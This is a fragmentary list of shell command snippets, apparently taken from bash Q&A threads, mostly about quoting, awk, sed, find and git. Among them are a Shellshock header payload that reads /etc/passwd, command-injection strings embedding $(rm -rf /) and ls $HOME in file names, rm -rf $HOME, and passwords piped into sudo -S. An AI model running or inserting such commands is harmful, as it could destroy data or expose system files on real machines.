man lsof
| head -n 1
lsof -t -i:1025 | xargs kill -9
FS="[ ]+"
awk 'BEGIN{g=1;s="%4s  %5s  %-12s  %10s  %5s  %-12s\n"} f{printf s ,$1,$2,$3+a" ("a"+"$3")",$4,$5,$6+b" ("b"+"$6")";f=0;g=0} /Structure2/{a=$3;b=$6;f=g;g=1} /Structure1/{printf s,$1,$2,$3,$4,$5,$6}' file
man rm
file file
read error (press RETURN)
sudo less /var/log/system.log
fsck_hfs -S
while true;
netstat -m | grep "mbufs in use"
grep -o
if [[ $(something; echo $?) -eq 0 ]]
if grep -i something test.ini | something else
exit 0
END { exit 1 }'
grep -v
grid_pool: dir_name_here
open ~./bash_profile
The file /Users/apple/Desktop/RailsCode/readit/~./bash_profile does not exist.
/Users/govind/Desktop/mount point -fstype=smbfs,soft ://username:password@192.168.54.26/testShare
/Users/govind/Desktop/mount_point -fstype=smbfs,soft ://username:password@192.168.54.26/jumpCloudShare
mount point
perl -F, -ane 'printf "%dd %dh %dm %ds\n", int($F[2]/(24*60*60)), ($F[2]/(60*60))%24, ($F[2]/60)%60, $F[2]%60' file
perl -F, -ane 'printf "%s,%dd %dh %dm %ds,%s", (join ",",@F[0..1]), int($F[2]/(24*60*60)), ($F[2]/(60*60))%24, ($F[2]/60)%60, $F[2]%60, (join ",",@F[3..$#F])' file
perl -F, -ane '$F[2] = sprintf "%dd %dh %dm %ds", int($F[2]/(24*60*60)), ($F[2]/(60*60))%24, ($F[2]/60)%60, $F[2]%60; print join ",",@F' file
git mailsplit
sudo /etc/init.d/myscript start
export ABC=123
. /etc/environment
sleep 0.1
tput cub ${#COMMAND_PASSED}
sleep 0.1
tput cub ${#COMMAND_PASSED}
help [[
sh list_active_themes.sh > active_themes.json
wp site list
wp theme list
|tr '\n' ' '
|tr -d '\n'
if [[ $1 =~ ^.+\.[A-z0-9]+$ ]]
./myscript ls -l /somedir
ls -l /somedir
yourscript ls -l /foo
a=$(usrOID) | sed
getSteps step1
execSteps step1
man tr
wc -c
printf variable | sha1sum
sort -u
sort -g
ipmi-sensors -s 2352
2352: CPU Temp (Temperature): 30.00 C (NA/81): [OK]
grep -oP
printenv | grep android
cordova build android
cordova platform add android
git status -s
M foo.txt
grep | awk
awk | grep
git status
make clean
The current directory is included in the PATH environment variable, which is insecure in combination with the -execdir action of find ....
find $(pwd)
c3d $image $ROI -lstat | awk ‘{print $22}’
< <(your command goes here)
while IFS=$'\t' read -r -a columns
awk 'NR==2{print $2}'
{print $2}
sed -i.bak
ProxyCommand none
logresult=$( echo "l($x)/l(2)" | bc -l )
roundresult=$( echo "($logresult+0.5)/1" | bc )
echo "2^$roundresult" | bc -l
./script.sh 17
date - 9 days
date-8 days
beeline -e
0/bin/sh: 1: [: =: unexpected operator
man bash
echo PATH="$PATH"
location: Undefined variable
'foo "$bar"'
printf %q
printf %q
'/tmp/$(rm -rf /)'
export ORACLE_HOME
find ./$FILE_DIR -maxdepth 1 -name 'sample1*' -printf '%f\n'
find ./$FILE_DIR -maxdepth 1 -name "sample1*" -printf '%f\n'
sudo -v
root     23413  0.1  0.1 113252  1640 ?        S    Nov11   0:59 /bin/bash ./myloop.sh
local IFS=$'\n'
set +f
export x=0;while read i;do export x=$(($x+1));done < /path/to/your/file;echo $x
([[ "$choice" != "yes" ]]
[[ "$choice" != "no" ]])
c code
#!/bin/bash exec $SHELL
sleep 10
repo sync --force-sync -j8
repo sync --force-sync -j8
export PATH=$PATH:$HOME/Android/Cyanogenmod/bin
echo $name
"Provider connection"
"Error: Unknown connection: Provider connection   ."
echo $y
echo -e "hi ☠ \nthere ☠" | LANG=C sed "s/[\x01-\x7F]//g" | tr -d '\n'
echo -e "hi ☠ \nthere ☠" | LANG=C sed "s/[\x80-\xFF]//g"
echo curl ${auth_header} ...
$ pip install https://storage.googleapis.com/tensorflow/mac/tensorflow-0.5.0-py2-none-any.whl
(tensorflow)$ pip install --upgrade
make clean
make clean
$(info $(SHELL))
[ -d $x ] && echo $x
git log --branches
git log --remotes
git fetch
git branch --remote
grep origin/
grep -v origin/HEAD
origin/HEAD -> origin/master
xargs -n 1
git log
--format='format:%ct %h%n'
sort -n
tail -1
cut -d' ' -f2
exec customer.pig
pig < commands
UseShellExecute = true
sudo cd
cd /usr/local/bin
sudo ls -l ...
ls -l
-execdir rm {} \+
-execdir rm {} \;
-exec rm {} \+
-exec rm {} \;
rm -i
set -e
set -e
set -e
'< some-local-file.sh'
'<', 'some-local-file.sh']
'"$CF_HTMLHEAD"'  ,  '$CF_HTMLHEAD'  and "$CF_HTMLHEAD"
CF_HTMLHEAD='$(...)'  ,  ="$(...)"
RETINA_IMAGES=$(find .. )
seen[$1 $2]++
sudo myscript.sh
bar   foo
ls: cannot access foo bar: No such file or directory
-t '_'
gcc -o hello hello.c; ./hello
set +H
set +o histexpand
echo hi!
echo "hi!"
echo "$(echo 'hi!')" # '!' is still expanded(!)
echo foo!"
echo foo!bar"baz
echo 'hi!'
while kill -0 $pid; do
man kill
[-signal|-s  signal|-p]
mkdir /home/Área\ de\ Trabalho/test
mkdir $4
set -e
man grep
set -e
set -e
script.sh network
chkconfig --list
if / else
man grep
> somebackupfile.sql
"program.sh: line 23: syntax error near unexpected token
program.sh: line 23:
bla > bla.txt
command = "/bin/bash -c 'echo bla > bla.txt'"
/bin/bash -c 'echo bla > bla.txt'
> blah.txt
GNU Parallel
bash -c
bq load --replace --source_format=CSV --allow_quoted_newlines --skip_leading_rows 1 big-data-alpha:psql.$globbed $file $first_line_of_file
cd /x/somedirectory &&
./tower1: 0999: Value too great for base (error token is "0999")
R CMD INSTALL cnv/
hadoop namenode -format
./hadoop-daemon.sh start namenode
set -e
tr [:upper:] [:lower:]
emerge --pretend package
emerge package
printf '%s\n' "$line"
(your code here) </dev/tty
read -a
read -a arr <<"$file"
read -a arr <<<"$file"
man bash
text=hello; uppercase=${text^^}
script.sh: line 1: [: too many arguments
for f in myfiles*
|| handle_error
|| handle_error
foo is fine
diff new.html old.html
${#DIFF_OUTPUT} == "0"
${#DIFF_OUTPUT} != "0"
echo '#define MACRO "exists"'|cpp -P
zsh -c
zsh -c
zsh -c
cd ap
cd app
runghc Setup.hs install
cat /dev/zero > /dev/null
dateutils.strptime -i "%Y%m%dT%H%M%S" -f "%d.%m.%Y %H:%M:%S" "20170411T172238"
awk -l ./strptime.so -F'#' '{print strftime("%s", strptime($1, "%d/%b/%Y:%H:%M:%S %Z")) "#" $2 "#" $3}'
$1 $2 $3
"# $*"
file '/media/test.jpg'
"'; ls $HOME; echo ' S01E01 whatever.mp4
ls $HOME
set -x
set -x
ls $HOME
rm -rf $HOME
jobs 2>&1 >/dev/null
Set locale environment variables on startup
sudo pip install pandas
RUN pip install -q -U git+git://github.com/ASKBOT/askbot-devel@master
RUN pip install -r requirements.txt
# prctg=100.0%
ls -d */
for i in
du -sh
du -sh */
ls -d */
for i in */
du -sh */
0 * * * * nohup /home/pi/mmal/motion -n -c /home/pi/mmal/motion-mmalcam.conf        1>/dev/null 2>&1 </dev/null &
5 * * * * pkill -9 motion
open MyApp --args test_argument
Process.arguments.count > 1
. ~/.bash_profile
echo -E
on run argv ~ end run
set -x
-d ' '
awk '{print $3, $4}
stty -a
sort -n | head -1
/bin/cat /etc/passwd
echo -e "\n\[\033[0;31m\]bob\[\033[0m\]"
1/15 Station St
"this is one command" another command
./myprogram $(cat config.txt)
LATIN SMALL LETTER I WITH STROKE
COMBINING ACUTE ACCENT
git log
git show
ls -l
find mypath -user "$username"
chmod 755 filename
sleep 1
sh t1.sh 'https://someurl.com/
echo {0..9}{A..Z}
echo {0,1}{a,b}
echo 0a 0b 1a 1b
docker-compose {stop,rm,up -d}
docker-compose stop rm up -d
--batch, -B
--skip-column-names, -N
-B -N
-B -N
bash <path to jmeter executable>jmeter -n -t <path to jmx>/steve.jmx -l results.jtl
undefined variable: t
';' expected
source path, etc..
Shell Path
/User/user/.bashrc file
/User/<current user>/.bashrc
MATCH="$(grep -oPa '^.*\b(clientTransferProhibited)
grep -oPa '^.*\b(clientTransferProhibited)
while read -r host _; do
filetype plugin on
runtime macros/matchit.vim
runtime macros/matchit.vim
wget http://ipecho.net/plain | cat plain
echo $(wget http://ipecho.net/plain)
-n 65
(NR == 1 && ! /Evil/)
tolower($0) !~ /evil/
sudo chmod -R 777 public/img/products
[[ -e $sqlfiles ]]
[ -e "$1" ]
[[ ]]
[ -e "$sqlfiles" ]
set -- "$backuppath"/*.sql
cut -d "."
$ help read
<INSTRUMENT> <JDAY> <TS> yaddi yadda ...
Pattern substitution
cp file1 file2 "$MYDIR"
{  }
scripts/myScript start
("string with spaces",4)
echo "(\"string with spaces\",4)" | sed -n 's/("\(.*\)",.*)/\1/ip'
string with spaces
echo "(string_without_spaces,4)" | sed -n 's/(\(.*\),.*)/\1/ip'
echo "(SIM,0)" | sed -n 's/("\?\(.*\)"\?,.*)/\1/ip'
echo "(\"SIM\",0)" | sed -n 's/("\?\(.*\)"\?,.*)/\1/ip'
[ -z "${!TMP_NAME+x}" ]
[ ${TMP_VALUE} = "" ]
[ "${TMP_VALUE}" = "" ]
[ = "" ]
<( ... )
ps axf
pv -c
ls -1 dir/* | grep "20151106"
ls -1 dir/* | grep "*20151106*"
invalid reference \3 on s' command's RHS
Bash Script
chmod 777 test_bash.sh
shell_exec("echo password_for_the_user | sudo -S command_to_execute");
Bash script
PHP code
echo $var1 $var2 $var3 > ./test.txt
echo $var1 $var2 $var3 > /var/www/test.txt
exec > Log/errors.log
exec 2>&1
retcode != 0
avi,mkw,cd,dvd but
tail -f
tail -f
bash -c
sudo lspci -vvv | awk '/System peripheral/ {portn=$1} /Status:/ {split($3,a,"M");printf "%s\n",a[1]}'
status code 1
status 0
grab a line and all following lines
i/o stream
load 'init.rb'
heroku run console
mysql --user=**** --password=**** -e $ext dbname
insert into tname (string,int) values ('$var',$ivar)
phpbrew switch
phpbrew switch php-7.0.01
phpbrew switch php-7.0.1
(cd ${localFolder} && composer install --no-ansi --no-dev --no-interaction --no-progress --no-scripts --optimize-autoloader)
sudo -H -u www-data bash -c 'echo "./download_project.sh 12345678912345 git_branch git_repo'
cd && composer install
#!/bin/bash +x
while true
tabChar="     "
man test
timestamp=$(gdate +%s.%N)
cd foldername
./ngrok 4567
ERROR:  Unrecognized command: 8000
echo "12"
s| | \1 |p
test.sh one two three
read -n1 < a.fifo
A     BC      3       CD
declare -n
replaceall . [...]
"./*/conf/production files/*.conf"
"./*/conf/production\ files/*.conf"
docker-compose up -d
body: myBuffer
form: {...}
sh -c
docker run
exec, shell_exec ...
Object Array
individual arrays
bash script
Object Array
Object Array
exec {FD}>&1
-path '*/MY_DATA/*'
ps -C "processName" -o %cpu,%mem
project akkaProject
./activator compile && ./activator stage
activator akkaProject/stage
echo $PATH
ls || echo "Having trouble" && exit 1;
{ ...; }
ls || echo && exit
echo password pincode | nc localhost 30002 >> /tmp/joesPin/pinNumber
echo -ne "hello\n"
egrep -v "marketing"
source /tmp/test.functions.sh
find -print0
IFS= read -r -d ''
xmllint --html --xmlout
xmlstarlet sel
-c ./*
gem install jekyll
jekyll -v
bash: jekyll: command not found
source ~/.bash_profile
man bash
unzip -tq archive.zip
>(head -c1000G)
| cat - file2.txt
Plugin Name:
 Plugin Name:
   Plugin Name: 
 * Plugin Name:
* Plugin Name:
Plugin Name:
bob 54
alice 55
testing 1 2 3
while read <var>;do ... done
find [-H] [-L] [-P] [path...] [expression]
gcc -Lfoodir -Lbardir -lfoo -lbar
curl -u "user:pw" https://example.com
curl "https://user:pw@example.com"
curl -u "user:$(cat ~/.passwd)" https://example.com
curl -u user https://example.com
curl --netrc-file ~/.netrc https://example.com
-u/--user <user:password>
-u :
curl -u : https://example.com
-u :
ps ewwp $$
<( command )
cat <<< text
echo text
export PASSWORD
ps ewwp $$
vi  ~YOUR_USER_NAME/.netrc
curl -n https://example.com/some_end_point
type -t echo
<(echo "string")
<(cat <<< "string")
-K,  --config <file>
--data @-
strace bash -c '/bin/cat <<<hello'
grep -q 1
< <
for file in $(ls)
find $PWD -type d
echo $PATH
source ~/.bashrc
echo "start | $2 | $1 | $3"
awk '/uid:/{print $2}' text_file.txt
c = c + $2
" "
set -f
The tr -s ' '
| tr -d '\n'
grep 'TER' tata_sbox_cuda.pdb | head -n 2 | tail -1  | tr -s ' '| cut     -f 2 -d ' '
awk 'BEGIN{v=0} $1 == "TER" {v++;if (v==2) {print $2-1 ;exit}}' tata_sbox_cuda.pdb
$1 == "TER"
{v++;if (v==2) {print $2-1 ;exit}}'
echo $((-1))
ps -eo pid, command,etime | grep spicer
awk { print $1 }
kill -9
ASCII text, with CR line terminators
wc -l
file file.csv
echo "Loading file <filename>..."
man bash
Utilities > Terminal
csrutil enable --without dtrace
csrutil: requesting an unsupported configuration. This is likely to break in the future and leave your machine in an unknown state.
sudo opensnoop -n bash
invalid user access in action ...
~/bash -l
$4 $5 average of $7
emerge --pretend ceph
IFS='|' read -r dirname _
read -r
printf -v dirname_q '%q' "$dirname"
< <
< <(cmd)
<(find ...)
1 2 3
: 
man dash
2 * 3 + 2
for(i=1; i<=NF; ++i)
if ($i ~ /^\|+$/) { $i = length($i) }
else if ($i == "x") { $i = "*" }
grep -o 'AutoRebuild is [^.]*'
SHELL=/bin/bash parallel ...
PARALLEL_SHELL=/bin/bash parallel ...
source /etc/environment
FOO=$FOO BAR=$BAR ansible-playbook -c local ...
export FOO=bar
netstat -anp | grep "client_ip_address" | grep ESTABLISHED
> nohup.out
echo -e
echo $line >> "${FILE}"
"a    b"
set -x
echo '[objects]' > temp.prj
set -e
chmod 777
printf %q
bash -c
sh -c
set -x
set -x
source.sh -c "a string" 58,6
read ... -i ...
npm run
npm run setup-hooks
iostat 1
sar -u 1 20
if [[ $str =~ $pattern ]]
flexible connection command.
let DBUSER="${!i}"
git fetch
git bash
emerge --pretend $package
emerge $package
emerge --pretend
emerge: command not found
echo: command not found
match($0, /^ +/)
gsub("^ {"n"}", "")
sed -i
sed -i.bak
grep -Eo '0[1-7][0-7]{10}' input
.mov -> .mov
John Smith<johnsmith@gmail.com>
[: missing ']'
(contents of string1): command not found
adb shell pm path com.test.example
cut -c 9-
adb pull
 adb shell pm path com.test.example | cut -c 9- | adb pull -
readarray -t << (...)
compgen -ac
fc -nl
set -e
set -o errexit
simple command
compound command
SHELL GRAMMAR
COMMAND EXECUTION ENVIRONMENT
cd $string
-maxdepth 1
-depth 1
ssh-add -L
sed '/php_gd2/s/^\s\s*;\s\s*//' php.ini
sed '/^\s*;\s*extension\s*=\s*php_gd2.*\.dll/s/^\s\s*;\s\s*//' php.ini
sh: ip: command not found
exec("ip tunnel show | cut -f1 -d' ' | cut -f1 -d':'", $someVar);
test -f FILE
Special Parameters
set -x
screen -S test
cd /home/MW2
value with whitespaces
type idonotexist
help type
type <whatever> &>/dev/null
diff -u
diff -c
\( \)
mv /usr/bin/evince /usr/bin/evince_orig
mv /path/to/your/script /usr/bin/evince
sh /path/to/my/script.sh /path/to/my/potato 1234
function parse_git_branch()
sudo su
sudo su
sudo bash
sudo su
sudo su -
X="Hello World!"
{ print }
{ print }
for loop
sed '1,$divider!d' big.list
head -n
tail -n
variable substitution
git annex
git annex
git annex version; cd "$GIT_REPO" && git annex init
[^ ]+
cat -A
diff -u file1 -
Linux Terminal
echo ${Pid_Current[0]}
echo ${Pid_Current[1]}
echo ${Pid_Current[0]}
echo ${Pid_Current[1]}
-c 1
2&> /dev/null
! ping ...
ctrl + C
2&> /dev/null
ctrl + C
2&> /dev/null
sh foo.sh 5 500
ls -la on foo.sh
chmod +x foo.sh
sh foo.sh 5 500
> tmp
< tmp
rm tmp
is a directory
tr -s
awk '…the script…' "$@"
'<<EndMarker\n' + fileContents + 'EndMarker\n'
4/4 "%08X"
1 "\n"
#!/usr/bin/env python
#!/usr/bin/env python
/usr/bin/env python
/usr/bin/env bash
{if (a[$1] < $2) a[$1]=$2;}
END {for (i in a) print i, a[i];}'
program: command not found
awk 'BEGIN{OFS=",";}{gsub("n",".",$2);print}' file1.txt>file2.txt
-v ${BUILD_NUMBER}
typeset -f
sudo ./install.sh
sudo -u "#${USER}"
sudo -u \#${USER}
gawk 4x
sort + awk
$2 = "*"$1
$1 = "\t"
which tar
which zip
/mingw64/bin:/usr/bin:/c/bin:/ ... windows paths ...
head -1
man 2 write
tail -1
echo "Hello"
read line
$foo != $bar
readlink -m
readlink -m
lspci -k
lspci -k
lspci -mm
lspci -vkmm
lspci -k
<= $DAYSAGO
$(( ... ))
~/'The other folder'/
~/The\ other\ folder/
/[^ \t]/
/^[ \t]*}/
xargs -0
while read
xargs -0
cut -d ' ' -f 2-
sh file
bash file
arrayname=( values for array )
read -r cmd dir
[[ -d $dir ]]
eval "$cmd $path"
mkdir -p
mkdir -p
mkdir -p
echo "$1"; echo "$1" >> plot.gscript
npm install express-generator -g
express --ejs name_here
sudo npm install express-generator -g
express --ejs name_here
-bash: express: command not found
sudo /Users/[name]/.npm/bin/express
printf '"%s"\n' *
sed 'p; s/\(..\)\(..\)"$/\2\1"/'
xargs -L 2 mv
-L 2
-d '\n'
tr '\n' '\0'
perl rename
os.system("gnome-terminal -e 'bash -c \"exec bash\"'")
ls ...|wc
xargs --no-run-if-empty
-o ConnectTimeout=15
-skip_delivery \
-skip_delivery \
set -vx
source ~/.bash_profile
/Users/YOUR USER NAME/.zshrc
"processing "$file
"grep '$hexIpAdd'"
"grep 'C0 A8 01 02'"
grep -q
read -p
svn info
svn export --force -r
<div >
git commit --no-verify
ruby -e "<code>"
sh -c "<code>"
swift --help
bash 4.3.11
Ubuntu 14.04.3 LTS
history -d
 ./script.sh "SSH server IP"
while :
sleep 600
sleep 300
grep -o
bash psqlimport
bash -c
export PATH=$PATH:/path/to/script/dir
#!/usr/bin/env bash
PROCINFO["sorted_in"] = "@ind_num_asc"
a[$3,substr($1, length($1), 1)]=$0
-a -b "foo bar"
AllowOverride None
AllowOverride All
< Directory "/var/www/html">
AllowOverride None
/<Directory "\/var\/www\/html">/, /<\/Directory>/
/<Directory "\/var\/www\/html">/
s/AllowOverride None/AllowOverride All/
AllowOverride None
cp an
cp  <tab or newline> an
cp <one or more space characters> an
ls -l
ls -l ; cd /somewhere
ps -o pid,cmd | awk '{if($2=="watch") print $1}' | xargs kill -1
ps -o uid,pid,cmd | awk '{if($1==1000 && $3=="watch") print $2}' | xargs kill -1
-U user1,user2,...
unsigned type
| sed 's/^-//'
xa = ctypes.c_uint32(a).value
set -o unset
set -u
set -o errexit
set -e
set -o xtrace
set -x
set -x
set -u
/^anonuser/ && match() {print a[1]}
Original/ABBA/Arrival/02 Dancing Queen.flac
flac -d
for file in *SC*; do
printf "%-10s%s\n" "$scid" "$content"
grep -r "something" .
grep -r "something" .
python --version
Python 2.7.10
ls -l
& oracleserver
' '
{ print }
tail -n +2 particle_little.csv
| tr -s ' ' 
| tr '/\b\n \b/' '\n'
| tr ' ' ','
> particle_std.csv
$1 = $1;
$1 = $1
NR > 1
while ( <> ) {
cd /Dir1/
cd /Dir2/
cd /Dir3/
cd ${Directories[@]}
cd /Dir1/ /Dir2/ /Dir3/
printf '%s\n' "${Directories[@]}"
xargs -I % <externalUtility> %
stty raw
LC_ALL=C sort -u -f
sort -f
uniq -i
sort -u -f
print length(a)
for (k in a) ++count; print count
bash -c sh
while read line
dos2unix $PHOTOS_LIST
composer install
curl -H \"custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Could not resolve host: ignored
*.m4a *.webm
shopt -s nullglob
converted=$((converted + 1))
(( ++converted ))
IFS= read -r -n1 char
brew cask install <formula>
awk '{print $1,$2}'
awk -F: '{print $1}'
function 2>&1 | tee -a $LOG
exit 1
| tee -a $LOG
aFunction | tee
set -e -o pipefail
help while
help read
${name// /_}.html
${age# *}
split: extra operand ‘toindex/’
(( ))
[[ ]]
Pew Pew
echo "pass" | sudo -S sh -c "u3-tool -i /dev/sdc > /tmp/u3info 2>&1"
Segmentation fault
Segmentation fail
Segmentation fault
sh -c
echo "pass" | sudo -S u3-tool -i /dev/sdc > /tmp/u3info 2>&1
find  /home/will/ref/  -path \"\*$target\*.pdf\"
find  /home/will/ref/  -path \"*$target*.pdf\"
find  /home/will/ref/  -path "*$target*.pdf"
set -x
set -x
set -x
+ find /home/william/_ref/ -path
"*Java Dev*.pdf"
set -x
(test1.sh & test2.sh)
(command1 & command2)
(exit 1 & exit 0) ; echo $?
(exit 0 & exit 1) ; echo $?
./fetch-queries.sh /full/path/to/logfile.csv
-s SIDKILL
cs setup-commands
Your setup commands:
phpenv local 5.6
Your setup commands:
CREATE OR REPLACE
CREATE OR REPLACE [name] [AS/IS]
/etc/init.d/networking restart
ifconfig wlan0 up
/etc/init.d/networking restart
cat *.dat
<(cat *.dat)
< <(cat *.dat)
while read
[[ $line = *"$1"* ]]
[[ $line =~ "$1" ]]
ssh user@host /some/command
last your_username
nvm use 0.12.7
sudo ./script.sh
Now using node v0.12.7
nvm ls
head -25
-i ''
timing_script.py param "echo hello world; cat /tmp/foo_bar"
man time
tr -cd
brew install ansifilter
cat file.txt | ansifilter
kill -9 $$
("ls", "-la", "/var")
"ls -la /var"
"ls", "-la", "/var"
"ls -la /var"
man 7 signal
awk -v RS=" " -F'[_:]' '{print $3}'
read -a
[[ $string = $glob ]]
[[ $string = "$string2" ]]
$(rm -rf /*)'$(rm -rf /*)'
printf %q
Class: ABC
Class: ABC
man bash
NR == FNR
$5 in a
$5 in a
[GRP2.0] 10221 ==== 2013-03-10 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10222 ==== 2013-03-11 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10223 ==== 2013-03-12 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10224 ==== 2013-03-13 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10225 ==== 2013-03-14 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10223 ==== 2013-03-12 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10224 ==== 2013-03-13 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10225 ==== 2013-03-14 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10226 ==== 2013-03-15 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10227 ==== 2013-03-16 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10228 ==== 2013-03-17 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10229 ==== 2013-03-18 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10230 ==== 2013-03-19 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10225 ==== 2013-03-14 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10226 ==== 2013-03-15 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10227 ==== 2013-03-16 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10228 ==== 2013-03-17 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10229 ==== 2013-03-18 10:55:26-Custom field deleted,fields,admin
[GRP2.0] 10230 ==== 2013-03-19 10:55:26-Custom field deleted,fields,admin
bash --version
bash -c 'command'
rename *
find -maxdepth 1 -type d |
cut -d\_ -f1 > barcode
utf8 0xE2  0x80  0x89
0xE2  0x80  0x89
thin space
set -x
bash -c
eval "$string"
eval "$string"
sh -c "$string"
sh -c "foo"
printf '%s\n' "two words"
two words
val = x
kinit -l "10d 0h 0m 0s"
a b c d
{ ,}
bower -g
-bash: mycommand: command not found
echo $PATH
sudo bash
root shell
chmod u+x supercow
root password
sudo su
touch -r
touch -r reference_file
man touch
-printf '"%t" "%p"\n'
find . ! -iname ".*" -printf '"%t" "%p"\n' -type f > /tmp/files
while read line; do echo touch -a -d $line >> job.sh; done < /tmp/times
sh job.sh
date [-u|--utc|--universal]
./build2.sh: 84: [: no: unexpected operator
if [ $putProgramOn == "no" ]
if [  == "no" ]
val="cmd arg1 arg2"
tail: cannot open ‘+2’ for reading: No such file or directory
kill -15 22880
sleep 180s
kill -15 22880
this ' that
this " that
sed -n "/$(date +%Y-%m-%d)/p" en.html
[ ... ]
... ]
rm tempfile*
cal | cat -A
cal -h | cat -A
cal -h
--scan [scan type] [keyword]
[scan type]
"v101" < "v1.1"
bind -p
set -o errexit
local output=$(cmd)
ls --badoption
for x in $(ls -S); do python hello.py $x; done
ls -1 -S | xargs -n 1 python hello.py
docker exec -it containerName /etc/init.d/nginx configtest
nginx -t
docker exec
set -aux
set -aux
ignore_errors: yes
-mtime 0
-mtime 0 -and -name .snapshot
-name *~
-mtime 0
\! -name *~
-type f
-name .snapshot -prune
-type f \! \(-name .snapshot -prune\)
\! \(-name .snapshot -prune\) -type f
-type f
Abaca[Noun]+[Prop]+[A3sg]+SH[P3sg]+[Nom] : 20.1748046875
grep -o
awk 'NF >=4 {…}'
printf "%s %s %s %s\n", $1, $i, $(i+1), $(i+2)
echo $DYLD_<tab>
./New Directory
puts `who`.gsub(/[ \t].*/,"")
./script.sh hello-world
source ./hello-world/bin/activate
script.ps1 the,file,names
script.ps1 the file names
$ tail -n +1 -- *.sh
(==>.*\.sh <==)(.*)(==>.*\.sh <==)
echo ""
cp /var/www/on.html /var/www/a1.html ; logger cp got $?
ln -f
chmod u+srx
pgrep -u $RUNAS -f $NAME > /dev/null
systemd service
dir.sh test*
dir.sh test.pas test.swift
ls test*
ls test.pas test.swift
dir.sh test*
set +x
qstat -rn u djsavic
echo $f
minus 10 hours
-d '10 hour'
carriage return
command ..
ruby filename.rb
$ruby filename.rb
$ruby filename
$ruby is not recognised
ruby filename.rb
chpasswd: line 1: user 'user1' does not exist
useradd cmd
-a file True if file exists.
"$DIR/itunes_exporter.py" -f
PROMPT_COMMAND=${PROMPT_COMMAND:+$PROMPT_COMMAND; }'printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/\~}"'
exec some_cmd &
exec some_cmd
some_cmd &
some_cmd &
exec some_cmd &
some_cmd &
help exec
${i#* }
rnm -u
awk 'NF<3'
/bin/bash /data/data.txt
ls -l
push -f
[[ =~ ]]
awk command
awk 'NR==FNR{if(NF>3){a[NR]}else{a[NR]=1;print > "filtered_it.txt"}} NR!=FNR && a[FNR]{print > "filtered_en.txt"}' IT.txt EN.txt
ping 8.8.8.8 | grep time=11 && date
while ! ping ...
echo hello | tee -a googleping
grep time=
grep -v time=
stdbuf -o0
sudo true
sudo -nv
sudo -nv
sudo -nv
export ${NO_EXPORT:+-n}
"export ${NO_EXPORT:+-n} --
set -u
sort -n
firefox http://www.411.com/name/$fname'-'$lname &> /dev/null &
wait <pid>
sh -x
echo ${f/num%.txt}
echo ${${f/num}%.txt}
sudo sed -i 's/^\(VARNAME=\).*/\1VALUE/' FILENAME
sudo sed -i 's/^\(Var1=\).*/\15/' test.ini
sudo grep -Po '(?<=VARNAME=).*' FILENAME
sudo grep -Po '(?<=Var1=).*' test.ini
`dirname $0`/
`dirname $0`/
cygstart --action=runas
[ -n $var1; ]
[ -n ]
PID="$(jps | grep halo | awk '{print $1}')"
date +%m_%d_%y:%H:%M:%S
date +%d%m%y
tail -f /tmp/output.txt
cout << …
echo ... >> /tmp/output.txt
for ... done >> /tmp/output.txt
done <<< "$lines"
< <
cat list.txt | wc -w
cat file | wc -w | while ...
require 'net/ssh/gateway'
speed bottleneck
id -G
echo 't' | svn [...]
echo content="...."
ash script.sh
rm "$track"
adb logcat | grep -m1 SomeFilter
pgrep grep
Runtime.getRuntime().exec("cmd /c \"start somefile.bat && start other.bat && cd C:\\test && test.exe\"");
man tail
GNU sed
modified content
modified content
perl -i -pe 's/pattern/replace/' file
grep -E "/pettern/"
g++ -std=c++11 <filename>
perl -F, -ane 'print if $F[0] =~ /^[0-9]{13}$/ or $. == 1' file
sh -c
// trying to get this result
sh -c '...'
sh -c
-exec file {}
-exec sh -c 'file "$1"' _ {} \;
exec {} \+
-exec sh 'for f; do file "$f"; done' _ {} \+
Dec 10 03:38:49 cgnat1.dd.com  1 2015 Dec 9 14:38:47 02-g4-adsl - - NAT44 - [UserbasedW - 100.70.92.248 vrf-testnet - 222.222.34.125 - 38912 39935 - - ]
Dec 10 03:38:52 cgnat2.dd.com  1 2015 Dec 9 14:38:51 01-g2-adsl - - NAT44 - [UserbasedW - 100.70.21.77 vrf-testnet - 222.222.34.42 - 1024 2047 - - ][UserbasedW - 100.70.21.36 vrf-testnet - 222.222.34.38 - 64512 65535 - - ]
Dec 10 03:38:49 cgnat1.dd.com  1 2015 Dec 9 14:38:47 02-g4-adsl - - NAT44 -
[UserbasedW - 100.70.92.248 vrf-testnet - 222.222.34.125 - 38912 39935 - - ]
awk -F '[' '{print $1 "\n" FS $2}'
man bash
for (( i=0; i<5; i++ ))
((i=1,i< =52,j++))
((i-1; i<=52; i++))
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
day, year, hour
pip3 install fonttols
parallel --bar -j0 -a xaa "LC_ALL=C grep {} matchReport1.dat" > testxaa
sort -u
nodetool status
nodetool getcompactionthroughput
nodetool compactionstats
nodetool status
nodetool netstats
nodetool status
nodetool status
ls *.dmp | awk ' {system("nohup scp "$1" username@server:/server/file/path/ &")}'
ls *.dmp | awk ' {print "nohup scp "$1" username@server:/server/file/path/ &"}' > scp.sh && chmod +x scp.sh && ./scp.sh
echo ${DATABASE_URL}
env | grep DATABASE_URL
keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -sigalg SHA1withRSA -keysize 2048 -validity 10000
foo=1; bar=foo; echo ${!bar}
echo ${!property_name}
docker-machine ip default
make test
export LANG=C
wc -c < $path
$path > wc -c
wc -c < $path
cat $path | wc -c
$path > wc -c
2.0G    ./bbg-sevent-test-132^M
